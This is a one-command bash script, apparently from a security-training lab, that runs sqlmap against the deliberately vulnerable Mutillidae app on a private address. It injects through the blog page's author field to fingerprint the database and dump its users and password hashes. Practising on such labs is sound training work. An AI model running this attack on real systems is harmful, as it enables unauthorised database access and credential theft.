#!/bin/bash
# Run an sqlmap against the trial Mutilldae page
sqlmap -u http://192.168.64.2/mutillidae/index.php?page=view-someones-blog.php \
    -f -b --current-user --current-db \
    --data "author=admin&view-someones-blog-php-submit-button=View+Blog+Entries" \
    --users --password

